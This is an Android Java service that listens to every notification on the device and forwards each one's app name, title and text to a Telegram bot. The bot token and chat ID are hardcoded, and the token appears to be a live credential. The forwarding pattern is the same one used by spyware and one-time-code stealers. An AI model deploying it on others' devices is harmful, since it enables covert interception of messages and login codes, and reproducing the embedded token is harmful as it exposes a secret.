package com.example.notificationbridge;

import android.app.Notification;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class NotificationListener extends NotificationListenerService {

    private static final String TAG = "NotifBridge";
    // 👇 PUT YOUR TELEGRAM BOT TOKEN AND CHAT ID HERE
    private static final String BOT_TOKEN = "8784269795:AAH6CMkTyR8N9h49DaRSpi-HmfVTLmvG_0I";
    private static final String CHAT_ID = "748395295";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            Notification n = sbn.getNotification();
            CharSequence title = n.extras.getCharSequence(Notification.EXTRA_TITLE);
            CharSequence text = n.extras.getCharSequence(Notification.EXTRA_TEXT);
            String pkg = sbn.getPackageName();

            if (text == null || text.length() == 0) return;

            String msg = "📱 " + pkg + "\n"
                    + "🔔 " + (title != null ? title : "") + "\n"
                    + (text != null ? text : "");

            sendToTelegram(msg);
        } catch (Exception e) {
            Log.e(TAG, "onNotificationPosted failed", e);
        }
    }

    private void sendToTelegram(String message) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                String body = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
                        + "&text=" + URLEncoder.encode(message, "UTF-8");

                conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(body.getBytes(StandardCharsets.UTF_8));
                }
                int code = conn.getResponseCode();
                Log.i(TAG, "Telegram response: " + code);
            } catch (Exception e) {
                Log.e(TAG, "Telegram send failed", e);
            } finally {
                if (conn != null) conn.disconnect();
            }
        }).start();
    }
}